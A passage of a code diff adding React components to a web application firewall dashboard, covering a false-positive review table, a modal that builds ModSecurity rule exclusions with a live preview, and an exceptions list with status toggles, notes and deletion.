+            <Filter size={14} color="#a1a1aa" />
+            <select
+              className="filter-select"
+              style={{ width: '130px', height: '38px', margin: 0, fontSize: '13px' }}
+              value={statusFilter}
+              onChange={(e) => setStatusFilter(e.target.value)}
+            >
+              <option value="">All Statuses</option>
+              <option value="Pending">Pending</option>
+              <option value="Reviewed">Reviewed</option>
+              <option value="Resolved">Resolved</option>
+            </select>
+          </div>
+          <select
+            className="filter-select"
+            style={{ width: '130px', height: '38px', margin: 0, fontSize: '13px' }}
+            value={severityFilter}
+            onChange={(e) => setSeverityFilter(e.target.value)}
+          >
+            <option value="">All Severities</option>
+            <option value="Critical">Critical</option>
+            <option value="High">High</option>
+            <option value="Medium">Medium</option>
+            <option value="Low">Low</option>
+          </select>
+          <input
+            type="text"
+            className="search-input"
+            style={{ width: '120px', height: '38px', margin: 0, fontSize: '13px', paddingLeft: '12px' }}
+            placeholder="Rule ID..."
+            value={ruleIdSearch}
+            onChange={(e) => setRuleIdSearch(e.target.value)}
+          />
+        </div>
+      </div>
+
+      {/* False Positive Log Table */}
+      <div className="table-container glass-panel" style={{ padding: 0 }}>
+        {loading ? (
+          <div style={{ padding: '40px', textAlign: 'center', color: '#a1a1aa' }}>Loading review registry...</div>
+        ) : entries.length === 0 ? (
+          <div style={{ padding: '60px 40px', textAlign: 'center', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '12px', alignItems: 'center' }}>
+            <ShieldCheck size={40} color="#a1a1aa" style={{ opacity: 0.3 }} />
+            <div style={{ fontWeight: 600, fontSize: '15px' }}>No marked false positives found</div>
+            <div style={{ fontSize: '12px', maxWidth: '300px', opacity: 0.7 }}>Legitimate requests incorrectly blocked by WAF policies will appear here for analyst tuning.</div>
+          </div>
+        ) : (
+          <table className="logs-table">
+            <thead>
+              <tr>
+                <th>Timestamp</th>
+                <th>Rule ID</th>
+                <th>IP Address</th>
+                <th>Requested URI</th>
+                <th>Severity</th>
+                <th>Status</th>
+                <th>Analyst Note</th>
+                <th style={{ textAlign: 'right' }}>Actions</th>
+              </tr>
+            </thead>
+            <tbody>
+              <AnimatePresence>
+                {entries.map((entry) => {
+                  const statusColors = {
+                    Pending: { bg: 'rgba(234,179,8,0.1)', color: '#fef08a', border: '1px solid rgba(234,179,8,0.2)' },
+                    Reviewed: { bg: 'rgba(59,130,246,0.1)', color: '#93c5fd', border: '1px solid rgba(59,130,246,0.2)' },
+                    Resolved: { bg: 'rgba(16,185,129,0.1)', color: '#a7f3d0', border: '1px solid rgba(16,185,129,0.2)' },
+                  };
+                  const colors = statusColors[entry.status] || statusColors.Pending;
+
+                  return (
+                    <motion.tr
+                      key={entry.id}
+                      initial={{ opacity: 0 }}
+                      animate={{ opacity: 1 }}
+                      exit={{ opacity: 0 }}
+                      className="log-row"
+                    >
+                      <td style={{ fontSize: '12px', color: '#94a3b8' }}>{entry.timestamp}</td>
+                      <td>
+                        <span className="log-rule-id" style={{ background: 'rgba(255,255,255,0.05)', color: '#e2e8f0', fontSize: '11px', padding: '3px 6px', borderRadius: '4px', fontFamily: 'monospace', border: '1px solid rgba(255,255,255,0.08)' }}>
+                          {entry.rule_id}
+                        </span>
+                      </td>
+                      <td style={{ fontFamily: 'monospace', color: '#38bdf8', fontSize: '13px' }}>{entry.client_ip}</td>
+                      <td className="payload-cell" style={{ fontFamily: 'monospace', fontSize: '12px', color: '#cbd5e1', maxWidth: '180px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={entry.uri}>
+                        {entry.uri}
+                      </td>
+                      <td>
+                        <span className={`severity-badge severity-${entry.severity.toLowerCase()}`}>
+                          {entry.severity}
+                        </span>
+                      </td>
+                      <td>
+                        <span style={{
+                          fontSize: '10px',
+                          fontWeight: 700,
+                          padding: '3px 8px',
+                          borderRadius: '12px',
+                          background: colors.bg,
+                          color: colors.color,
+                          border: colors.border,
+                          textTransform: 'uppercase'
+                        }}>
+                          {entry.status}
+                        </span>
+                      </td>
+                      <td style={{ fontSize: '12px', color: '#94a3b8', maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={entry.analyst_note}>
+                        {entry.analyst_note || <em style={{ opacity: 0.5 }}>No note</em>}
+                      </td>
+                      <td style={{ textAlign: 'right' }}>
+                        <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-end' }}>
+                          <button
+                            className="action-btn-inspect"
+                            onClick={() => {
+                              setSelectedLog(entry);
+                              setIsLogModalOpen(true);
+                            }}
+                            style={{ padding: '4px 8px', fontSize: '11px' }}
+                          >
+                            Inspect
+                          </button>
+
+                          {userRole === 'admin' && entry.status !== 'Resolved' && (
+                            <button
+                              className="action-btn-inspect"
+                              onClick={() => onCreateException(entry)}
+                              style={{ padding: '4px 8px', fontSize: '11px', borderColor: 'rgba(249, 115, 22, 0.4)', color: '#fdba74' }}
+                            >
+                              Bypass WAF
+                            </button>
+                          )}
+                        </div>
+                      </td>
+                    </motion.tr>
+                  );
+                })}
+              </AnimatePresence>
+            </tbody>
+          </table>
+        )}
+      </div>
+
+      {/* Dedicated False Positive Inspector Modal */}
+      <FalsePositiveDetailsModal
+        isOpen={isLogModalOpen}
+        entry={selectedLog}
+        onClose={() => {
+          setIsLogModalOpen(false);
+          setSelectedLog(null);
+        }}
+        onUpdateStatus={handleUpdateStatus}
+        onSaveNote={handleSaveNote}
+        onCreateException={onCreateException}
+        onDeleteEntry={handleDeleteEntry}
+        userRole={userRole}
+      />
+    </motion.div>
+  );
+}
+
+function CreateExceptionModal({ isOpen, log, onClose, onSubmit }) {
+  const [exclusionType, setExclusionType] = useState('uri');
+  const [uri, setUri] = useState('');
+  const [parameterName, setParameterName] = useState('');
+  const [httpMethod, setHttpMethod] = useState('GET');
+  const [clientIp, setClientIp] = useState('');
+  const [notes, setNotes] = useState('');
+  const [previewRule, setPreviewRule] = useState('');
+  const [submitting, setSubmitting] = useState(false);
+  const [errorMsg, setErrorMsg] = useState('');
+
+  useEffect(() => {
+    if (isOpen && log) {
+      const timer = setTimeout(() => {
+        setExclusionType('uri');
+        setUri(log.uri || '/');
+        setParameterName('');
+        setHttpMethod(log.method || 'GET');
+        setClientIp(log.client_ip || '');
+        setNotes('');
+        setPreviewRule('');
+        setErrorMsg('');
+      }, 0);
+      return () => clearTimeout(timer);
+    }
+  }, [isOpen, log]);
+
+  useEffect(() => {
+    if (!isOpen || !log) return;
+
+    const fetchPreview = async () => {
+      try {
+        const payload = {
+          rule_id: log.rule_id,
+          exclusion_type: exclusionType,
+          uri: exclusionType !== 'parameter' ? uri : null,
+          parameter_name: (exclusionType === 'parameter' || exclusionType === 'uri_parameter') ? parameterName : null,
+          http_method: exclusionType === 'endpoint_method' ? httpMethod : null,
+          client_ip: exclusionType === 'ip_suppression' ? clientIp : null
+        };
+        const res = await previewExclusionRule(payload);
+        setPreviewRule(res.modsec_rule);
+        setErrorMsg('');
+      } catch (err) {
+        setPreviewRule('');
+        setErrorMsg(err.message || 'Error compiling rule preview.');
+      }
+    };
+
+    const delayDebounce = setTimeout(fetchPreview, 250);
+    return () => clearTimeout(delayDebounce);
+  }, [exclusionType, uri, parameterName, httpMethod, clientIp, isOpen, log]);
+
+  if (!isOpen || !log) return null;
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    setSubmitting(true);
+    setErrorMsg('');
+
+    if (exclusionType !== 'parameter' && (uri === '/' || uri.trim() === '')) {
+      setErrorMsg("Broad exclusions on the root path ('/') are blocked to protect WAF integrity.");
+      setSubmitting(false);
+      return;
+    }
+
+    try {
+      const payload = {
+        false_positive_id: log.id,
+        rule_id: log.rule_id,
+        exclusion_type: exclusionType,
+        uri: exclusionType !== 'parameter' ? uri : null,
+        parameter_name: (exclusionType === 'parameter' || exclusionType === 'uri_parameter') ? parameterName : null,
+        http_method: exclusionType === 'endpoint_method' ? httpMethod : null,
+        client_ip: exclusionType === 'ip_suppression' ? clientIp : null,
+        notes: notes
+      };
+      await onSubmit(payload);
+      onClose();
+    } catch (err) {
+      setErrorMsg(err.message || 'Failed to create exclusion policy.');
+    } finally {
+      setSubmitting(false);
+    }
+  };
+
+  return createPortal(
+    <div className="modal-overlay" onClick={onClose}>
+      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '560px' }}>
+        <div className="modal-header">
+          <div className="modal-title">
+            <AlertTriangle size={20} color="#f97316" />
+            <span>Create WAF Exception Exclusions</span>
+          </div>
+          <button className="modal-close-btn" onClick={onClose}>
+            <X size={18} />
+          </button>
+        </div>
+        <form onSubmit={handleSubmit}>
+          <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+            {errorMsg && (
+              <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.25)', color: '#fca5a5', padding: '10px 14px', borderRadius: '6px', fontSize: '13px' }}>
+                {errorMsg}
+              </div>
+            )}
+
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', background: 'rgba(255,255,255,0.02)', padding: '12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', fontSize: '12px' }}>
+              <div>
+                <span style={{ color: '#a1a1aa' }}>Origin Log Rule ID:</span>
+                <div style={{ fontFamily: 'monospace', fontWeight: 600, color: '#fff', marginTop: '2px' }}>{log.rule_id}</div>
+              </div>
+              <div>
+                <span style={{ color: '#a1a1aa' }}>Attack Category:</span>
+                <div style={{ fontWeight: 600, color: '#eab308', marginTop: '2px' }}>{log.attack_type}</div>
+              </div>
+            </div>
+
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+              <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Exception Strategy</label>
+              <select
+                className="filter-select"
+                style={{ width: '100%', height: '36px' }}
+                value={exclusionType}
+                onChange={(e) => setExclusionType(e.target.value)}
+              >
+                <option value="uri">Exclude Rule ID for this URI / Endpoint</option>
+                <option value="parameter">Exclude Rule ID for this Parameter globally</option>
+                <option value="uri_parameter">Exclude Rule ID for this Parameter on this URI</option>
+                <option value="endpoint_method">Exclude Rule ID for this URI and HTTP Method</option>
+                <option value="ip_suppression">Suppress Alerts for this Client IP and URI</option>
+              </select>
+            </div>
+
+            {exclusionType !== 'parameter' && (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Target Endpoint URI</label>
+                <input
+                  type="text"
+                  className="search-input"
+                  style={{ width: '100%', height: '36px', fontSize: '13px', fontFamily: 'monospace' }}
+                  value={uri}
+                  onChange={(e) => setUri(e.target.value)}
+                  required
+                />
+              </div>
+            )}
+
+            {(exclusionType === 'parameter' || exclusionType === 'uri_parameter') && (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Target Parameter Name</label>
+                <input
+                  type="text"
+                  className="search-input"
+                  style={{ width: '100%', height: '36px', fontSize: '13px', fontFamily: 'monospace' }}
+                  placeholder="e.g. username, search_query, comment"
+                  value={parameterName}
+                  onChange={(e) => setParameterName(e.target.value)}
+                  required
+                />
+              </div>
+            )}
+
+            {exclusionType === 'endpoint_method' && (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>HTTP Method</label>
+                <select
+                  className="filter-select"
+                  style={{ width: '100%', height: '36px' }}
+                  value={httpMethod}
+                  onChange={(e) => setHttpMethod(e.target.value)}
+                >
+                  <option value="GET">GET</option>
+                  <option value="POST">POST</option>
+                  <option value="PUT">PUT</option>
+                  <option value="DELETE">DELETE</option>
+                  <option value="PATCH">PATCH</option>
+                </select>
+              </div>
+            )}
+
+            {exclusionType === 'ip_suppression' && (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Target Client IP Address</label>
+                <input
+                  type="text"
+                  className="search-input"
+                  style={{ width: '100%', height: '36px', fontSize: '13px', fontFamily: 'monospace' }}
+                  value={clientIp}
+                  onChange={(e) => setClientIp(e.target.value)}
+                  required
+                />
+              </div>
+            )}
+
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+              <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Justification Reason</label>
+              <textarea
+                className="settings-input"
+                style={{ height: '80px', resize: 'none', background: 'rgba(0,0,0,0.2)', padding: '10px' }}
+                placeholder="E.g., verified search query parameters as legitimate business traffic..."
+                value={notes}
+                onChange={(e) => setNotes(e.target.value)}
+                required
+              />
+            </div>
+
+            {previewRule && (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Auto-Generated ModSecurity Rule Preview</span>
+                <pre style={{ margin: 0, padding: '12px', background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '6px', color: '#10b981', fontFamily: 'monospace', fontSize: '11px', overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
+                  {previewRule}
+                </pre>
+              </div>
+            )}
+          </div>
+          <div className="modal-footer" style={{ display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
+            <button type="button" className="modal-btn secondary" onClick={onClose}>Cancel</button>
+            <button type="submit" className="modal-btn primary" disabled={submitting} style={{ background: '#f97316', borderColor: '#f97316', color: '#000', fontWeight: 600 }}>
+              {submitting ? "Applying exception..." : "Apply WAF Exception"}
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>,
+    document.body
+  );
+}
+
+function ExclusionDetailsModal({ isOpen, exclusion, onClose }) {
+  const [copied, setCopied] = useState(false);
+
+  useEffect(() => {
+    if (copied) {
+      const t = setTimeout(() => setCopied(false), 2000);
+      return () => clearTimeout(t);
+    }
+  }, [copied]);
+
+  if (!isOpen || !exclusion) return null;
+
+  const handleCopy = () => {
+    navigator.clipboard.writeText(exclusion.modsec_rule)
+      .then(() => setCopied(true))
+      .catch(err => console.error("Copy failed", err));
+  };
+
+  const typeLabels = {
+    uri: 'URI-Specific Bypass',
+    parameter: 'Global Parameter Exclusion',
+    uri_parameter: 'Parameter Bypass on URI',
+    endpoint_method: 'Endpoint & Method Exclusion',
+    ip_suppression: 'Client IP & URI Alert Suppression'
+  };
+
+  return createPortal(
+    <div className="modal-overlay" onClick={onClose}>
+      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '580px' }}>
+        <div className="modal-header">
+          <div className="modal-title">
+            <ShieldCheck size={20} color="#10b981" />
+            <span>Active Exclusion Rule Config</span>
+          </div>
+          <button className="modal-close-btn" onClick={onClose}>
+            <X size={18} />
+          </button>
+        </div>
+        <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+
+          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', background: 'rgba(255,255,255,0.02)', padding: '12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', fontSize: '13px' }}>
+            <div>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Exclusion Policy ID:</span>
+              <div style={{ fontWeight: 600, color: '#fff', marginTop: '2px', fontFamily: 'monospace' }}>EX-Ref #{exclusion.id}</div>
+            </div>
+            <div>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Target WAF Rule ID:</span>
+              <div style={{ fontWeight: 600, color: '#fdba74', marginTop: '2px', fontFamily: 'monospace' }}>Rule #{exclusion.rule_id}</div>
+            </div>
+            <div style={{ marginTop: '8px' }}>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Strategy Type:</span>
+              <div style={{ fontWeight: 600, color: '#3b82f6', marginTop: '2px' }}>{typeLabels[exclusion.exclusion_type] || exclusion.exclusion_type}</div>
+            </div>
+            <div style={{ marginTop: '8px' }}>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Created By / When:</span>
+              <div style={{ fontWeight: 600, color: '#fff', marginTop: '2px', fontSize: '12px' }}>@{exclusion.created_by} on <span style={{ color: '#a1a1aa' }}>{exclusion.created_at}</span></div>
+            </div>
+          </div>
+
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+            <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Scope Targets</span>
+            <div style={{ background: 'rgba(0,0,0,0.2)', padding: '10px 14px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', display: 'flex', flexDirection: 'column', gap: '6px', fontFamily: 'monospace', fontSize: '12px' }}>
+              {exclusion.uri && (
+                <div>
+                  <span style={{ color: '#a1a1aa' }}>URI Endpoint:</span> <span style={{ color: '#38bdf8' }}>{exclusion.uri}</span>
+                </div>
+              )}
+              {exclusion.parameter_name && (
+                <div>
+                  <span style={{ color: '#a1a1aa' }}>Parameter:</span> <span style={{ color: '#fb923c' }}>{exclusion.parameter_name}</span>
+                </div>
+              )}
+              {exclusion.http_method && (
+                <div>
+                  <span style={{ color: '#a1a1aa' }}>HTTP Method:</span> <span style={{ color: '#f43f5e' }}>{exclusion.http_method}</span>
+                </div>
+              )}
+              {exclusion.client_ip && (
+                <div>
+                  <span style={{ color: '#a1a1aa' }}>Client IP:</span> <span style={{ color: '#10b981' }}>{exclusion.client_ip}</span>
+                </div>
+              )}
+            </div>
+          </div>
+
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+            <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Justification Notes</span>
+            <div style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.04)', borderRadius: '6px', padding: '12px', fontSize: '13px', color: '#cbd5e1', fontStyle: exclusion.notes ? 'normal' : 'italic', whiteSpace: 'pre-wrap' }}>
+              {exclusion.notes || "No justification reason recorded."}
+            </div>
+          </div>
+
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+              <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Compiled ModSecurity Rule Directive</span>
+              <button
+                onClick={handleCopy}
+                style={{ background: 'transparent', border: 'none', color: copied ? '#10b981' : '#3b82f6', fontSize: '11px', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '4px', cursor: 'pointer' }}
+              >
+                {copied ? <Check size={12} /> : <Copy size={12} />}
+                <span>{copied ? 'Copied' : 'Copy Directive'}</span>
+              </button>
+            </div>
+            <pre style={{ margin: 0, padding: '12px', background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '6px', color: '#10b981', fontFamily: 'monospace', fontSize: '11px', overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
+              {exclusion.modsec_rule}
+            </pre>
+          </div>
+
+        </div>
+        <div className="modal-footer">
+          <button className="modal-btn secondary" onClick={onClose}>Close Inspector</button>
+        </div>
+      </div>
+    </div>,
+    document.body
+  );
+}
+
+function Exceptions() {
+  const [exclusions, setExclusions] = useState([]);
+  const [analytics, setAnalytics] = useState(null);
+  const [history, setHistory] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [search, setSearch] = useState('');
+  const [statusFilter, setStatusFilter] = useState('');
+  const [activeSubTab, setActiveSubTab] = useState('active_exceptions');
+
+  const [editingExclusion, setEditingExclusion] = useState(null);
+  const [editNotes, setEditNotes] = useState('');
+  const [isNoteModalOpen, setIsNoteModalOpen] = useState(false);
+  const [successMsg, setSuccessMsg] = useState('');
+  const [errorMsg, setErrorMsg] = useState('');
+
+  const [selectedExclusion, setSelectedExclusion] = useState(null);
+  const [isExclusionModalOpen, setIsExclusionModalOpen] = useState(false);
+
+  const fetchExclusions = async () => {
+    setLoading(true);
+    try {
+      const filters = {};
+      if (search.trim()) filters.search = search.trim();
+      if (statusFilter) filters.status = statusFilter;
+
+      const [excData, anaData, histData] = await Promise.all([
+        getExclusions(filters),
+        getExclusionsAnalytics(),
+        getExclusionsHistory()
+      ]);
+
+      setExclusions(excData);
+      setAnalytics(anaData);
+      setHistory(histData);
+    } catch (err) {
+      console.error("Failed to load exclusions", err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      fetchExclusions();
+    }, 0);
+    return () => clearTimeout(timer);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [search, statusFilter]);
+
+  const handleToggleStatus = async (id, currentStatus) => {
+    const nextStatus = currentStatus === 'Active' ? 'Disabled' : 'Active';
+    try {
+      await updateExclusionStatus(id, nextStatus);
+      setSuccessMsg(`Exception rule successfully ${nextStatus === 'Active' ? 'activated' : 'disabled'}!`);
+      setTimeout(() => setSuccessMsg(''), 3000);
+      fetchExclusions();
+    } catch (err) {
+      console.error("Failed to toggle status", err);
+      alert(err.message || "Failed to update exception status.");
+    }
+  };
+
+  const handleSaveNotes = async (e) => {
+    e.preventDefault();
+    try {
+      await updateExclusionNote(editingExclusion.id, editNotes);
+      setSuccessMsg("Exclusion notes updated successfully!");
+      setIsNoteModalOpen(false);
+      setTimeout(() => setSuccessMsg(''), 3000);
+      fetchExclusions();
+    } catch (err) {
+      console.error("Failed to save exclusion notes", err);
+      setErrorMsg(err.message || "Failed to update notes.");
+    }
+  };
+
+  const handleDeleteExclusion = async (id) => {
+    if (!window.confirm("Are you sure you want to permanently delete this exception policy? The target rule will instantly resume blocking traffic.")) return;
+    try {
+      await deleteExclusion(id);
+      setSuccessMsg("Exclusion policy deleted and WAF synchronized.");
+      setTimeout(() => setSuccessMsg(''), 3000);
+      fetchExclusions();
+    } catch (err) {
+      console.error("Failed to delete exclusion", err);
+      alert(err.message || "Failed to remove exclusion.");
+    }
+  };
+
+  const handleInspectExclusion = (entry) => {
+    setSelectedExclusion(entry);
+    setIsExclusionModalOpen(true);
+  };
+
+  return (
+    <motion.div
+      initial={{ opacity: 0, y: 15 }}
+      animate={{ opacity: 1, y: 0 }}
+      exit={{ opacity: 0, y: -15 }}
+      transition={{ duration: 0.25 }}
+      style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}
+    >
+      <AnimatePresence>
+        {successMsg && (
+          <motion.div
+            initial={{ opacity: 0, y: -20 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: -20 }}
+            style={{
+              position: 'fixed', top: '24px', right: '24px', background: 'var(--success-color)', color: '#000',
+              padding: '12px 24px', borderRadius: '8px', zIndex: 10000, fontWeight: 600, display: 'flex', gap: '8px', alignItems: 'center',
+              boxShadow: '0 10px 15px -3px var(--success-glow)'
+            }}
+          >
+            <ShieldCheck size={18} />
+            <span>{successMsg}</span>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {analytics && (
+        <div className="dashboard-grid animate-fade-in" style={{ gap: '16px', marginBottom: '8px' }}>
+          <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
+            <div className="metric-header">
+              <span>Active WAF Exclusions</span>
+              <div className="metric-icon-wrapper orange" style={{ background: 'rgba(249, 115, 22, 0.1)', color: '#f97316' }}><AlertTriangle size={18} /></div>
+            </div>
+            <div className="metric-value" style={{ color: '#f97316' }}>{analytics.active_exclusions}</div>
+            <div className="metric-trend trend-up">
+              <span>Active bypass rules overriding CRS</span>
+            </div>
+          </div>
+
+          <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
+            <div className="metric-header">
+              <span>Global System Health</span>
+              <div className="metric-icon-wrapper green"><ShieldCheck size={18} /></div>
+            </div>
+            <div className="metric-value" style={{ color: 'var(--success-color)' }}>100%</div>
+            <div className="metric-trend trend-down">
+              <span>System engine sync OK</span>
+            </div>
+          </div>
+
+          <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
+            <div className="metric-header">
+              <span>Disabled Exceptions</span>
+              <div className="metric-icon-wrapper red"><X size={18} /></div>
+            </div>
+            <div className="metric-value" style={{ color: 'var(--danger-color)' }}>{analytics.disabled_exclusions}</div>
+            <div className="metric-trend trend-down">
+              <span>Deactivated exclusions</span>
+            </div>
+          </div>
+        </div>
+      )}
+
+      <div className="subtabs-container">
+        <button
+          className={`subtab-btn ${activeSubTab === 'active_exceptions' ? 'active' : ''}`}
+          onClick={() => setActiveSubTab('active_exceptions')}
+        >
+          <AlertTriangle size={14} />
+          <span>Active WAF Exclusions ({exclusions.length})</span>
+        </button>
+        <button
+          className={`subtab-btn ${activeSubTab === 'audit_history' ? 'active' : ''}`}
+          onClick={() => setActiveSubTab('audit_history')}
+        >
+          <Database size={14} />
+          <span>Exceptions Audit Logs ({history.length})</span>
+        </button>
+      </div>
+
+      {activeSubTab === 'active_exceptions' && (
+        <>
+          <div className="glass-panel" style={{ padding: '16px 20px', display: 'flex', flexWrap: 'wrap', gap: '16px', alignItems: 'center' }}>
+            <div style={{ position: 'relative', flex: 1, minWidth: '200px' }}>
+              <Search size={16} color="#a1a1aa" style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)' }} />
+              <input
+                type="text"
+                className="search-input"
+                style={{ paddingLeft: '36px', height: '38px', margin: 0, width: '100%' }}
+                placeholder="Search rule ID, endpoint, parameters, justification..."
+                value={search}
+                onChange={(e) => setSearch(e.target.value)}
+              />
+            </div>
+            <div style={{ display: 'flex', gap: '12px' }}>
+              <select
+                className="filter-select"
+                style={{ width: '150px', height: '38px', margin: 0, fontSize: '13px' }}
+                value={statusFilter}
+                onChange={(e) => setStatusFilter(e.target.value)}
+              >
+                <option value="">All Statuses</option>
+                <option value="Active">Active</option>
+                <option value="Disabled">Disabled</option>
+              </select>
+            </div>
+          </div>
+
+          <div className="table-container glass-panel" style={{ padding: 0 }}>
+            {loading ? (
+              <div style={{ padding: '40px', textAlign: 'center', color: '#a1a1aa' }}>Syncing exceptions database...</div>
+            ) : exclusions.length === 0 ? (
+              <div style={{ padding: '60px 40px', textAlign: 'center', color: '#a1a1aa', display: 'flex', flexDirection: 'column', gap: '12px', alignItems: 'center' }}>
+                <AlertTriangle size={40} color="#a1a1aa" style={{ opacity: 0.3 }} />
+                <div style={{ fontWeight: 600, fontSize: '15px' }}>No active exclusion rules registered</div>
+                <div style={{ fontSize: '12px', maxWidth: '300px', opacity: 0.7 }}>Approved exceptions designed from false positives will list here to selectively bypass WAF filters.</div>
+              </div>
+            ) : (
+              <table className="logs-table">
+                <thead>
+                  <tr>
+                    <th>Rule ID</th>
+                    <th>Strategy Type</th>
+                    <th>Target Scope</th>
+                    <th>Created By</th>
+                    <th>Justification Notes</th>
+                    <th>Status</th>
+                    <th style={{ textAlign: 'right' }}>Actions</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <AnimatePresence>
+                    {exclusions.map((entry) => {
+                      const typeLabels = {
+                        uri: 'URI Bypass',
+                        parameter: 'Global Param',
+                        uri_parameter: 'Param on URI',
+                        endpoint_method: 'URI + Method',
+                        ip_suppression: 'IP Suppression'
+                      };
+                      return (
+                        <motion.tr
+                          key={entry.id}
+                          initial={{ opacity: 0 }}
+                          animate={{ opacity: 1 }}
+                          exit={{ opacity: 0 }}
+                          className="log-row"
+                        >
+                          <td>
+                            <span className="log-rule-id" style={{ background: 'rgba(255,255,255,0.05)', color: '#fff', fontSize: '11px', padding: '3px 6px', borderRadius: '4px', fontFamily: 'monospace' }}>
+                              {entry.rule_id}
+                            </span>
+                          </td>
+                          <td style={{ fontWeight: 600, fontSize: '12px', color: '#fdba74' }}>
+                            {typeLabels[entry.exclusion_type] || entry.exclusion_type}
+                          </td>
+                          <td style={{ fontFamily: 'monospace', fontSize: '12px', color: '#cbd5e1', maxWidth: '240px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                            {entry.exclusion_type === 'parameter' && `Param: ${entry.parameter_name}`}
+                            {entry.exclusion_type === 'uri' && `URI: ${entry.uri}`}
+                            {entry.exclusion_type === 'uri_parameter' && `URI: ${entry.uri} [Param: ${entry.parameter_name}]`}
+                            {entry.exclusion_type === 'endpoint_method' && `URI: ${entry.uri} [Method: ${entry.http_method}]`}
+                            {entry.exclusion_type === 'ip_suppression' && `URI: ${entry.uri} [IP: ${entry.client_ip}]`}
+                          </td>
+                          <td style={{ fontSize: '12px', color: '#94a3b8' }}>@{entry.created_by}</td>
+                          <td style={{ fontSize: '12px', color: '#94a3b8', maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={entry.notes}>
+                            {entry.notes}
+                          </td>
+                          <td>
+                            <span
+                              onClick={() => handleToggleStatus(entry.id, entry.status)}
+                              style={{
+                                fontSize: '10px',
+                                fontWeight: 700,
+                                padding: '3px 8px',
+                                borderRadius: '12px',
+                                background: entry.status === 'Active' ? 'rgba(16,185,129,0.1)' : 'rgba(239,68,68,0.1)',
+                                color: entry.status === 'Active' ? '#a7f3d0' : '#fca5a5',
+                                border: entry.status === 'Active' ? '1px solid rgba(16,185,129,0.2)' : '1px solid rgba(239,68,68,0.2)',
+                                textTransform: 'uppercase',
+                                cursor: 'pointer'
+                              }}
+                            >
+                              {entry.status}
+                            </span>
+                          </td>
+                          <td style={{ textAlign: 'right' }}>
+                            <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-end' }}>
+                              <button
+                                className="action-btn-inspect"
+                                onClick={() => handleInspectExclusion(entry)}
+                                style={{ padding: '4px 8px', fontSize: '11px' }}
+                              >
+                                View Config
+                              </button>
+
+                              <button
+                                className="action-btn-inspect"
